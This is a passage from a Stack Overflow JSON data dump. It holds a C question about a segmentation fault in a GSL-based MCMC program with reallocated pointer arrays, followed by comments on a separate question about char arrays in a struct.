return;\n}\n</code></pre>\n\n<p>which is what ultimately is running when the Segmentation fault: 11 is returned. Now for the sake of testing while developing I force the code to generate a new proposal Gaussian components with a function random_birth_move. First I updated the number of proposed components and reallocate memory for vector_ptr_array_proposed</p>\n\n<pre><code>no_comp_proposed = no_comp_current+1;\nvector_ptr_array_proposed = realloc(vector_ptr_array_proposed, sizeof(gsl_vector)*(no_comp_proposed));\n</code></pre>\n\n<p>Then call random_birth_move( arg )</p>\n\n<pre><code>random_birth_move(r,vector_ptr_array_current,vector_ptr_array_proposed);\n</code></pre>\n\n<p>where r and a gsl_rng pointer for random number generation. Below is the random_birth_move function</p>\n\n<pre><code>void random_birth_move(gsl_rng *r, gsl_vector *vector_ptr_array_current[], gsl_vector *vector_ptr_array_proposed[]) {\n    int i; // loop counter\n    // initialize and allocate memory for a new component vector\n    gsl_vector *x;           \n    x = gsl_vector_alloc(4);\n\n    gsl_vector_set(x,0,no_comp_proposed); // set the vector ID\n\n    // set the model parameters of the proposed vector\n    for (i=1;i&lt;NO_PARAMS;i++) {\n        // randomly set each parameter ~ U[0.0,5.0]\n        gsl_vector_set(x,i,gsl_ran_flat(r,0.0,5.0)); \n    }\n\n    // store the old vectors in the proposed pointer array\n    for (i=0;i&lt;no_comp_current;i++) {\n        // copy current pointers to proposed array (destination, source) \n         gsl_vector_memcpy(vector_ptr_array_proposed[i],vector_ptr_array_current[i]);\n        //vector_ptr_array_proposed[i] = vector_ptr_array_current[i];\n    }\n    // store the new vector component\n    vector_ptr_array_proposed[no_comp_current] = x;\n    return;\n}\n</code></pre>\n\n<p>Now if I call the print_components function to print vector_ptr_array_proposed all is well. Now I just assume the proposal is accepted at this moment in development. This acceptance is done by the following function:</p>\n\n<pre><code>void accept_move_prop_to_curr(gsl_vector *vector_ptr_array_proposed[]) {\n    int i; // loop counter\n    no_comp_current = no_comp_proposed; // update current number of components\n\n    // reallocate current vector ptr array to size of new one\n    vector_ptr_array_current = realloc(vector_ptr_array_current,(sizeof(gsl_vector)*(no_comp_proposed)));\n\n\n    for (i=0;i&lt;no_comp_current;i++) {\n         gsl_vector_memcpy(vector_ptr_array_current[i],vector_ptr_array_proposed[i]);\n    }\n\n    return;\n}\n</code></pre>\n\n<p>which is where I believe the problem lives. This function can be called and performed without errors. The seg fault error comes when I print during testing. Printing vector_ptr_array_proposed still results in the correct answer without issues. If I pass (&amp;vector_ptr_array_current[0],1) to print_components it works, but if I pass the next pointer, again a Segmentation fault: 11 occurs ( (&amp;vector_ptr_array_current[1],1) that is). I appreciate your help.</p>\n\n<p>Edit:</p>\n\n<p>This is the code as it stands</p>\n\n<pre><code>/*--------Include Files-----------------------------------------------------------------*/\n#include &lt;stdio.h&gt;\n#include &lt;gsl/gsl_rng.h&gt;\n#include &lt;gsl/gsl_randist.h&gt;\n#include &lt;gsl/gsl_math.h&gt;\n#include &lt;math.h&gt;\n\n/*--------Defines-----------------------------------------------------------------------*/\n#define NO_PARAMS 4            // This is the number of parameters in the model\n#define PROB_BIRTH_DEATH 0.0   // probability of choosing a birth/death move\n#define PROPOSAL_SIGMA   0.1   // sigma for proposal density\n\n// upper and lower limits on uniform priors for gaussian component parameters\n#define amp_lower 0.0\n#define amp_upper 10.0\n#define avg_lower -10.0\n#define avg_upper 10.0\n#define sigma_lower 0.00000001 // to prevent any division by zero in model evaluations\n#define sigma_upper 10.0\n\n\n/*--------Globals-----------------------------------------------------------------------*/\nint no_rows, no_cols;            // number of rows and columns in data file\nint no_comp_current;             // counter for number of components in use currently\nint no_comp_proposed;            // number of components proposed\ngsl_vector **vector_ptr_array_current;\ngsl_vector **vector_ptr_array_proposed;\n\ndouble amp_prior;\ndouble avg_prior;\ndouble sigma_prior;\n\n\n/*--------Function Prototypes-----------------------------------------------------------*/\n\n// Initialize parameters for initial gsl_vector before MCMC commences.\nvoid initialize_parameters(gsl_vector *x, gsl_rng *r);  \n\n\nvoid random_birth_move(gsl_rng *r, gsl_vector *vector_ptr_array_current[], gsl_vector *vector_ptr_array_proposed[]);\nvoid random_death_move(gsl_rng *r, gsl_vector *vector_ptr_array_current[], gsl_vector *vector_ptr_array_proposed[]);\n\n// If a move is accepted we need to reallocate vector_ptr_array_current to hold the\n// stuff in vector_ptr_array_proposed\nvoid accept_move_prop_to_curr(gsl_vector *vector_ptr_array_proposed[]);\n\n\n// print the components' ID and parameters  (mostly for testing)\nvoid print_components(gsl_vector *vector_ptr_array[], int length);\n\n\n// Calculates the log of the prior probability density function (pdf)\ndouble log_prior_pdf(gsl_vector *vector_ptr_array[], int no_comps);                   \n\n//  Calculates the log likelihood given the current and proposed parameters.\ndouble log_lklhood(gsl_vector *vector_ptr_array[], int no_comp, gsl_matrix *data_matrix);\n\n// evaluate the model \ndouble evaluate_model(gsl_vector *x, double t);       \n\n// propose a random variate (rvs) from the proposal density\nvoid propose_parameters(gsl_vector *x, gsl_vector *y, gsl_rng *r);    \n\n\n\n/*----------------------------------------------------------------------------------------\n *----------------------------------------------------------------------------------------\n *----------------------------------------------------------------------------------------\n *                                      Main Program\n *----------------------------------------------------------------------------------------\n *----------------------------------------------------------------------------------------\n *----------------------------------------------------------------------------------------\n */\n\n int main(int argc, char* argv[]) {\n\n    printf(\"---------------------------------------------------------------------------\");\n    printf(\"\\n\\n\");\n\n\n\n    /*\n     *------------------------------------------------------------------------------------\n     *--------Initialization--------------------------------------------------------------\n     *------------------------------------------------------------------------------------\n     */\n    //////////\n    int i,j,itr;                  // MCMC iteration counter\n    char ch;                  // for counting of rows and columns lated of input file\n    char filename[100];       // for in_file and out_file specification\n    FILE *in_file;            // input data file\n    FILE *out_file;           // output sample file\n\n    double amp,mean,sigma;    // variables to describe a gaussian component\n    double u,v;               // random variates ~U[0,1] for making choices\n    int acceptance_id;        // identifier for acceptance or rejections.\n\n    double lg_lklhood_y;      // log likelihood evaluated for proposed parameters\n    double lg_lklhood_x;      // log likelihood evaluated for current parameters\n    double lg_prior_x;        // log prior evaluated at current parameters\n    double lg_prior_y;        // log prior evaluated at proposed parameters\n\n    amp_prior = 1.0/(amp_upper-amp_lower); // for prior calculations later\n    avg_prior = 1.0/(avg_upper-avg_lower);\n    sigma_prior = 1.0/(sigma_upper-sigma_lower);\n\n\n    double MH_ratio_num;      // metropolis hastings ratio numerator\n    double MH_ratio_denom;    // the denominator\n    double accept_prob;       // acceptance probability for proposed parameters\n\n\n    gsl_matrix *data_matrix;  // matrix to read in stored data\n\n    //////////\n\n\n    //////////\n    // Initialize random generators\n    const gsl_rng_type * T;\n    gsl_rng * r;\n\n    // Allocate generate and specify type\n    r = gsl_rng_alloc(gsl_rng_mt19937); \n    gsl_rng_set(r,1);       // seed is set to 1 \n    //////////\n\n\n    //////////\n    gsl_vector *x,*y;            // current state gsl_vector, and proposed\n    x = gsl_vector_alloc(4);     // allocate memory for gsl_vector\n    y = gsl_vector_alloc(4);     // for proposal components\n\n    // gsl_vector *vector_ptr_array_current[1]; // array of pointers to gsl_vector structs\n    // gsl_vector ** //(in front of line below)\n    vector_ptr_array_current = (gsl_vector **)malloc(sizeof(gsl_vector)*1);\n    vector_ptr_array_proposed = (gsl_vector **)malloc(sizeof(gsl_vector)*1);\n\n    // Initialize first component ID and parameters\n    initialize_parameters(x,r); // Starting with one component for now\n    no_comp_current = 1;\n    no_comp_proposed = 1;\n\n    vector_ptr_array_current[0] = x; // store gsl_vector pointer in an array which will change\n                                     // size as code runs\n\n    //////////\n\n\n    //////// open input file and generate data matrix\n    sprintf(filename,\"%s\",argv[1]); // convert input file to string\n    in_file = fopen(filename,\"rb\");  // open input file for reading\n    if (in_file == NULL) {\n        printf(\"ERROR opening input file\\n\\n\");\n        exit(1);\n    }\n\n    // how many rows and columns\n    no_rows = 0;\n    no_cols = 0;\n\n    while(!feof(in_file)) { // count rows\n        ch = fgetc(in_file);\n        if(ch == '\\n'){\n            no_rows++;\n        }\n    }\n    rewind(in_file);\n    ch = 'a';\n    while(ch != '\\n') { // count columns\n        ch = fgetc(in_file);\n        if (ch == ' ') {\n            no_cols++;\n        }\n    }\n\n    no_cols +=1;               // convert the M could to number of columns\n    rewind(in_file);           // so that it can be scanned to generate a matrix\n    printf(\"Input data file\\n        no_rows: %i\\n        no_cols: %i\\n\\n\",no_rows,no_cols);\n\n    data_matrix = gsl_matrix_alloc(no_rows,no_cols); // allocate memory for data matrix\n    gsl_matrix_fscanf(in_file,data_matrix);          // scan in file to matrix\n    fclose(in_file);\n    ////////\n\n    // set number of iterations from input\n    itr = atoi(argv[2]);\n\n    // create output file\n    sprintf(filename,\"%s\",argv[3]); // convert input file to string\n    out_file = fopen(filename,\"wb\");  // open input file for reading\n    printf(\"Output file created: %s\\n\",filename);\n\n    /*\n     *------------------------------------------------------------------------------------\n     *--------Initialization Completed----------------------------------------------------\n     *------------------------------------------------------------------------------------\n     */\n\n\n    // BELOW IS SOME TESTING OF VARIOUS FUNCTIONS\n\n    printf(\"\\nRandom Birth move:\\n\");\n\n    // Proposing a random birth move\n    print_components(vector_ptr_array_current,no_comp_current);\n    printf(\"\\n\");\n\n    no_comp_proposed = no_comp_current+1;\n    vector_ptr_array_proposed = realloc(vector_ptr_array_proposed, sizeof(gsl_vector)*(no_comp_proposed));\n\n    random_birth_move(r,vector_ptr_array_current,vector_ptr_array_proposed);\n\n    // lets assume previous stuff was accepted\n    accept_move_prop_to_curr(vector_ptr_array_proposed);\n\n    print_components(vector_ptr_array_current,no_comp_current);\n    printf(\"You have made it!!!!!\\n\");\n    /*\n    printf(\"\\n\\nRandom Death move:\\n\");\n\n    // propose a random death move\n    no_comp_proposed = no_comp_current-1;\n    vector_ptr_array_proposed = realloc(vector_ptr_array_proposed,(sizeof(gsl_vector)*(no_comp_proposed)));\n    random_death_move(r,vector_ptr_array_current,vector_ptr_array_proposed);\n    print_components(vector_ptr_array_proposed, no_comp_proposed);\n\n    accept_move_prop_to_curr(vector_ptr_array_proposed);\n    */\n\n\n    /*\n     *------------------------------------------------------------------------------------\n     *--------MCMC Initiated--------------------------------------------------------------\n     *------------------------------------------------------------------------------------\n     */\n    printf(\"\\nMCMC Initialized\\n\");\n\n    lg_prior_x = log_prior_pdf(vector_ptr_array_current, no_comp_current);  // calculate the log prior\n    lg_lklhood_x = log_lklhood(vector_ptr_array_current, no_comp_current, data_matrix); // calculate the log likelihood\n\n    int model_idx;                // index to specify which model is to be updated\n    gsl_vector *current_comp_ptr; // currently viewed gsl_vector\n\n\n    for (i=0;i&lt;itr;i++) {\n        // Birth/Death move or normal?\n        v = gsl_rng_uniform(r); \n        if (v &lt; PROB_BIRTH_DEATH) { // perform birth/death move\n            continue;\n        } else { \n            // randomly choose one component to potentially update\n            model_idx = gsl_rng_uniform_int(r,no_comp_current);\n            current_comp_ptr = vector_ptr_array_current[model_idx];\n\n            // propose a new set of parameters\n            propose_parameters(current_comp_ptr,y,r);\n\n            // copy all of the current ptrs into this proposed ptr array\n            vector_ptr_array_proposed = (gsl_vector **)malloc(sizeof(gsl_vector)*no_comp_current);\n            for (j=0;j&lt;no_comp_current;j++) {\n                if (j==model_idx) {\n                    vector_ptr_array_proposed[model_idx] = y;\n                } else {\n                    gsl_vector_memcpy(vector_ptr_array_proposed[j],vector_ptr_array_current[j]);    \n                }\n            }\n\n            // calculate the log likelihood of proposed parameters\n            lg_lklhood_y = log_lklhood(vector_ptr_array_proposed, no_comp_current, data_matrix);\n            // calculate priors on the proposed parameters\n            lg_prior_y = log_prior_pdf(vector_ptr_array_proposed, no_comp_current);\n            // calculate the acceptance probability\n            MH_ratio_num = lg_prior_y + lg_lklhood_y;\n            MH_ratio_denom = lg_prior_x + lg_lklhood_x;\n\n\n            accept_prob = GSL_MIN(1.0, exp(MH_ratio_num-MH_ratio_denom));\n\n            // Decide whether to accept or not\n            u = gsl_rng_uniform(r);\n\n            if (u &lt; accept_prob) { // accept the proposed moved\n                // store the likelihoods and priors\n                lg_lklhood_x = lg_lklhood_y;\n                lg_prior_x = lg_prior_y;\n\n                // store the proposed ptr array into the current one\n                no_comp_proposed = no_comp_current; // prevents some bug, a bandaid atm\n                accept_move_prop_to_curr(vector_ptr_array_proposed);\n                acceptance_id = 1;\n\n\n            } else {\n                acceptance_id = 0;\n            }\n\n\n            // gotta print stuff to output file\n\n            // print the iteration, log likelihood, number of components\n            fprintf(out_file,\"%i %f %i \", i, lg_lklhood_x, no_comp_current);\n\n            // print component parameters\n            for (j=0;j&lt;no_comp_current;j++) {\n                current_comp_ptr = vector_ptr_array_current[j];\n                amp = gsl_vector_get(current_comp_ptr,1);\n                mean = gsl_vector_get(current_comp_ptr,2);\n                sigma = gsl_vector_get(current_comp_ptr,3);\n                fprintf(out_file,\"%f %f %f \", amp, mean, sigma);\n            }\n            // print acceptance id\n            fprintf(out_file,\"%i\\n\", acceptance_id);\n\n        }\n\n\n    }\n\n    /*\n     *------------------------------------------------------------------------------------\n     *--------MCMC Completed--------------------------------------------------------------\n     *------------------------------------------------------------------------------------\n     */\n\n    // close output file\n    fclose(out_file);\n\n    // Free memory\n    gsl_vector_free(x);\n    gsl_vector_free(y);\n    gsl_rng_free(r);\n\n    printf(\"MCMC Completed\\n\");\n    printf(\"\\n\\n\");\n    printf(\"---------------------------------------------------------------------------\");\n    printf(\"\\n\");\n\n    return 0;\n}\n\n/*--------------------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------------------*/\n\nvoid initialize_parameters(gsl_vector *x, gsl_rng *r) {\n    int i; // loop iterator\n\n    gsl_vector_set(x,0,1); // set an identification number starting at 1\n\n    for (i=1;i&lt;NO_PARAMS;i++) {\n        // randomly set each parameter ~ U[0.0,5.0]\n        gsl_vector_set(x,i,gsl_ran_flat(r,0.0,5.0)); \n    }\n\n    return;\n}\n\n/*--------------------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------------------*/\n\nvoid random_birth_move(gsl_rng *r, gsl_vector *vector_ptr_array_current[], gsl_vector *vector_ptr_array_proposed[]) {\n    int i; // loop counter\n    // initialize and allocate memory for a new component vector\n    gsl_vector *x;           \n    x = gsl_vector_alloc(4);\n\n    gsl_vector_set(x,0,no_comp_proposed); // set the vector ID\n\n    // set the model parameters of the proposed vector\n    for (i=1;i&lt;NO_PARAMS;i++) {\n        // randomly set each parameter ~ U[0.0,5.0]\n        gsl_vector_set(x,i,gsl_ran_flat(r,0.0,5.0)); \n    }\n\n    // store the old vectors in the proposed pointer array\n    for (i=0;i&lt;no_comp_current;i++) {\n        // copy current pointers to proposed array (destination, source) \n        // gsl_vector_memcpy(vector_ptr_array_proposed[i],vector_ptr_array_current[i]);\n        vector_ptr_array_proposed[i] = vector_ptr_array_current[i];\n    }\n    // store the new vector component\n    vector_ptr_array_proposed[no_comp_current] = x;\n\n    return;\n}\n\n/*--------------------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------------------*/\n\nvoid print_components(gsl_vector *vector_ptr_array[], int length) {\n    int i; // loop counter\n    gsl_vector *current_comp_ptr; // gsl_vector ptr for current component under consideration\n\n    // variable initialization\n    int id;\n    double amp,mean,sigma;\n\n    for (i=0;i&lt;length;i++) {\n        current_comp_ptr = vector_ptr_array[i];\n        id = gsl_vector_get(current_comp_ptr,0); // get the id from current vector\n        amp = gsl_vector_get(current_comp_ptr,1);\n        mean = gsl_vector_get(current_comp_ptr,2); \n        sigma = gsl_vector_get(current_comp_ptr,3);  \n        printf(\"ID: %i, amplitude: %f, mean: %f, sigma %f \\n\",id,amp,mean,sigma);\n    }\n\n    return;\n}\n\n/*--------------------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------------------*/\n\nvoid random_death_move(gsl_rng *r, gsl_vector *vector_ptr_array_current[], gsl_vector *vector_ptr_array_proposed[]) {\n    int i; // loop counter\n    int j=0; // counter of index store in propose array\n\n    gsl_vector *current_comp_ptr; // currently viewed gsl_vector\n\n    // randomly select an ID to be proposed for death\n    long unsigned int id;\n    int id_current;\n    id = gsl_rng_uniform_int(r,no_comp_current)+1;\n\n    for (i=0;i&lt;no_comp_current;i++) {\n        current_comp_ptr = vector_ptr_array_current[i];\n        id_current = (int)gsl_vector_get(current_comp_ptr, 0); // get the current ID value\n        if (id_current != id) { // then store it in proposed array of ptrs\n            gsl_vector_set(current_comp_ptr,0,j+1); // reassign ID number\n            vector_ptr_array_proposed[j] = current_comp_ptr;\n            j++;\n        }\n    }\n\n    return;\n}\n\n/*--------------------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------------------*/\n\nvoid accept_move_prop_to_curr(gsl_vector *vector_ptr_array_proposed[]) {\n    int i; // loop counter\n    no_comp_current = no_comp_proposed; // update current number of components\n\n    // reallocate current vector ptr array to size of new one\n    vector_ptr_array_current = realloc(vector_ptr_array_current,(sizeof(gsl_vector)*(no_comp_proposed)));\n\n    printf(\"\\n\\n\");\n    //gsl_vector_memcpy(vector_ptr_array_current[0],vector_ptr_array_proposed[0]);\n    //printf(\"%i\\n\",no_comp_proposed);\n    memcpy(vector_ptr_array_current[0],vector_ptr_array_proposed[0],sizeof(vector_ptr_array_proposed[0]));\n    print_components(&amp;vector_ptr_array_proposed[0],1);\n    /*\n    for (i=0;i&lt;no_comp_current;i++) {\n        printf(\"proposed: \");\n        print_components(&amp;vector_ptr_array_proposed[i],1);\n        gsl_vector_memcpy(vector_ptr_array_current[i],vector_ptr_array_proposed[i]);\n        printf(\"current: \");\n        print_components(&amp;vector_ptr_array_current[i],1);\n        printf(\"\\n\");\n    }\n    */\n    return;\n}\n\n/*--------------------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------------------*/\n\ndouble log_prior_pdf(gsl_vector *vector_ptr_array[], int no_comp) {\n    double amplitude,mean,sigma;     // to store component parameter values\n    double val = 0.0;                // store current value\n    int i;                           // loop counter\n\n\n    for (i=0;i&lt;no_comp;i++){\n        amplitude = gsl_vector_get(vector_ptr_array[i],1);\n        mean = gsl_vector_get(vector_ptr_array[i],2);\n        sigma = gsl_vector_get(vector_ptr_array[i],3);\n\n        if (amplitude &lt; amp_lower || amplitude &gt; amp_upper) { \n            return -1.0e16;\n        } else if (mean &lt; avg_lower || mean &gt; avg_upper) {\n            return -1.0e16;\n        } else if (sigma &lt; sigma_lower || sigma &gt; sigma_upper) {\n            return -1.0e16;\n        } else {\n            val += log(amp_prior*avg_prior*sigma_prior);\n        }\n    }\n    return val;\n}\n\n/*--------------------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------------------*/\n\ndouble log_lklhood(gsl_vector *vector_ptr_array[], int no_comp, gsl_matrix *data_matrix) {\n\n    int i,j;\n    double t,z_t;\n    double chi_square;\n\n    chi_square = 0.0;\n\n    for (i=0;i&lt;no_rows;i++) {\n        t = gsl_matrix_get(data_matrix,i,0); // extract current time\n        z_t = 0.0;\n        for (j=0;j&lt;no_comp;j++) { // add up contribution from each model at this time\n            z_t += evaluate_model(vector_ptr_array[j],t);\n        }\n        chi_square += pow((gsl_matrix_get(data_matrix,i,1) - z_t),2.0);\n    }\n\n    //return -chi_square;\n    return 1.0; // test prior recovery\n}\n\n/*--------------------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------------------*/\n\ndouble evaluate_model(gsl_vector *x, double t) {\n\n    double arg; // argument of exponential for gaussian model\n    double amplitude,mean,sigma;\n\n    // set the parameters\n    amplitude = gsl_vector_get(x,1);\n    mean = gsl_vector_get(x,2);\n    sigma = gsl_vector_get(x,3);\n\n    arg = -pow((t-mean),2.0)/2.0/pow(sigma,2.0);\n    return amplitude*exp(arg);\n}\n\n/*--------------------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------------------*/\n/*--------------------------------------------------------------------------------------*/\n\nvoid propose_parameters(gsl_vector *x, gsl_vector *y, gsl_rng *r) {\n    int i;      // loop iterator\n    double val; // value to set \n\n    gsl_vector_set(y,0,gsl_vector_get(x,0));\n\n    for (i=1;i&lt;NO_PARAMS;i++) { // choose rvs from gaussian\n        val = gsl_ran_gaussian(r,PROPOSAL_SIGMA)+gsl_vector_get(x,i);\n        gsl_vector_set(y,i,val);\n    }\n\n    return;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "pointers", "struct"], "comments": [{"owner": {"reputation": 4168, "user_id": 6273251, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-fCGXep-7snc/AAAAAAAAAAI/AAAAAAAAADk/nk_YDFGfkc0/photo.jpg?sz=128", "display_name": "Random Davis", "link": "https://stackoverflow.com/users/6273251/random-davis"}, "edited": false, "score": 0, "creation_date": 1482877198, "post_id": 41352854, "comment_id": 69907688, "body": "I would think that <code>char *2Darray</code> should be <code>char **2Darray</code>, seeing as it&#39;s an array of arrays of characters, right?"}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1482877230, "post_id": 41352854, "comment_id": 69907694, "body": "this can&#39;t compile."}, {"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 1, "creation_date": 1482877238, "post_id": 41352854, "comment_id": 69907698, "body": "Need to at least malloc some space for ob first"}, {"owner": {"reputation": 58398, "user_id": 3233393, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c4c576e0ebcdf0efd653269a5b020347?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/3233393/quentin"}, "edited": false, "score": 4, "creation_date": 1482877243, "post_id": 41352854, "comment_id": 69907702, "body": "<code>char *2Darray[2]={somearray, somepointer};</code> is not valid C, both because the variable name starts with a digit, and because C doesn&#39;t have in-struct initializers. Apart from that, you are accessing through <code>ob</code> without having initialized it beforehand."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1482877312, "post_id": 41352854, "comment_id": 69907722, "body": "When you initialize <code>2Darray</code>, you&#39;re using the existing value of <code>somepointer</code>. Assigning to <code>somepointer</code> after that doesn&#39;t update the value of <code>2Darray[1]</code> with its new value."}, {"owner": {"reputation": 53, "user_id": 4650140, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b86773f688a7fa97b0cf0873478063e8?s=128&d=identicon&r=PG&f=1", "display_name": "Pedro", "link": "https://stackoverflow.com/users/4650140/pedro"}, "edited": false, "score": 0, "creation_date": 1482877318, "post_id": 41352854, "comment_id": 69907723, "body": "sorry I know, it was just for demonstration purposes, I&#39;ll correct that"}, {"owner": {"reputation": 1767, "user_id": 4110406, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/64150ed89bffb39ecd38f1f573afaaed?s=128&d=identicon&r=PG&f=1", "display_name": "Ludwig Schulze", "link": "https://stackoverflow.com/users/4110406/ludwig-schulze"}, "edited": false, "score": 1, "creation_date": 1482877388, "post_id": 41352854, "comment_id": 69907749, "body": "Have you actually tried this? Which compiler was able to compile this?"}, {"owner": {"reputation": 58398, "user_id": 3233393, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c4c576e0ebcdf0efd653269a5b020347?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/3233393/quentin"}, "edited": false, "score": 2, "creation_date": 1482877450, "post_id": 41352854, "comment_id": 69907771, "body": "There is still the problem of that in-class initializer. I never expected to say that, but C is not C++14!"}, {"owner": {"reputation": 53, "user_id": 4650140, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b86773f688a7fa97b0cf0873478063e8?s=128&d=identicon&r=PG&f=1", "display_name": "Pedro", "link": "https://stackoverflow.com/users/4650140/pedro"}, "edited": false, "score": 0, "creation_date": 1482877475, "post_id": 41352854, "comment_id": 69907779, "body": "Im not actually using this code, this is just to demonstrate my question, im using visual studio 15"}, {"owner": {"reputation": 1767, "user_id": 4110406, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/64150ed89bffb39ecd38f1f573afaaed?s=128&d=identicon&r=PG&f=1", "display_name": "Ludwig Schulze", "link": "https://stackoverflow.com/users/4110406/ludwig-schulze"}, "edited": false, "score": 1, "creation_date": 1482877575, "post_id": 41352854, "comment_id": 69907807, "body": "Well, make your example behave as you say it does, then come back."}, {"owner": {"reputation": 53, "user_id": 4650140, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b86773f688a7fa97b0cf0873478063e8?s=128&d=identicon&r=PG&f=1", "display_name": "Pedro", "link": "https://stackoverflow.com/users/4650140/pedro"}, "edited": false, "score": 0, "creation_date": 1482877698, "post_id": 41352854, "comment_id": 69907852, "body": "I know that, this was just to demonstrate my question, the *ob I actually get it as a parameter for the function in the real program"}, {"owner": {"reputation": 53, "user_id": 4650140, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b86773f688a7fa97b0cf0873478063e8?s=128&d=identicon&r=PG&f=1", "display_name": "Pedro", "link": "https://stackoverflow.com/users/4650140/pedro"}, "edited": false, "score": 0, "creation_date": 1482877812, "post_id": 41352854, "comment_id": 69907893, "body": "the code is just to big to put ir here, my question is just why it works with the array but not with the pointer"}, {"owner": {"reputation": 58398, "user_id": 3233393, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c4c576e0ebcdf0efd653269a5b020347?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/3233393/quentin"}, "edited": false, "score": 1, "creation_date": 1482879202, "post_id": 41352854, "comment_id": 69908292, "body": "Then remove irrelevant code until you have something that you can post, and actually reproduces the problem. There&#39;s no way we can tell what&#39;s wrong with your real code from a partial recreation in pseudo-C syntax..."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1482880504, "post_id": 41352854, "comment_id": 69908712, "body": "It would be better to declare February as <code>char fevereiro[29];</code> and then set <code>mesSize[1]</code> to 28 or 29 as needed. The fact that the February array may be bigger than necessary shouldn&#39;t hurt anything."}, {"owner": {"reputation": 53, "user_id": 4650140, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b86773f688a7fa97b0cf0873478063e8?s=128&d=identicon&r=PG&f=1", "display_name": "Pedro", "link": "https://stackoverflow.com/users/4650140/pedro"}, "edited": false, "score": 0, "creation_date": 1482880586, "post_id": 41352854, "comment_id": 69908737, "body": "Yes I know but I am curious as to why it does not work"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1482880834, "post_id": 41352854, "comment_id": 69908812, "body": "Hard to say, since A) you still haven&#39;t posted a <a href=\"https://stackoverflow.com/help/mcve\">minimal, complete, and verifiable example</a>, and B) the code you have posted is not valid C code."}, {"owner": {"reputation": 53, "user_id": 4650140, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b86773f688a7fa97b0cf0873478063e8?s=128&d=identicon&r=PG&f=1", "display_name": "Pedro", "link": "https://stackoverflow.com/users/4650140/pedro"}, "edited": false, "score": 0, "creation_date": 1482881011, "post_id": 41352854, "comment_id": 69908860, "body": "the program only crashes when i remove  if (i == 1)             {                 if (mes-&gt;fevereiro[j] == &#39;K&#39;);                 counter++;              }"}, {"owner": {"reputation": 53, "user_id": 4650140, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b86773f688a7fa97b0cf0873478063e8?s=128&d=identicon&r=PG&f=1", "display_name": "Pedro", "link": "https://stackoverflow.com/users/4650140/pedro"}, "edited": false, "score": 0, "creation_date": 1482881158, "post_id": 41352854, "comment_id": 69908892, "body": "And it is valid C code since I copied it directly from the program"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1482882419, "post_id": 41352854, "comment_id": 69909223, "body": "You&#39;re most likely compiling with a C++ compiler. A true C compiler won&#39;t allow the initializers in the structure definition."}, {"owner": {"reputation": 53, "user_id": 4650140, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b86773f688a7fa97b0cf0873478063e8?s=128&d=identicon&r=PG&f=1", "display_name": "Pedro", "link": "https://stackoverflow.com/users/4650140/pedro"}, "edited": false, "score": 0, "creation_date": 1482883050, "post_id": 41352854, "comment_id": 69909337, "body": "Yes im using a C++ compiler, but is that the source of the problem im asking?"}], "answers": [{"tags": [], "owner": {"reputation": 2966, "user_id": 3022310, "user_type": "registered", "accept_rate": 95, "profile_image": 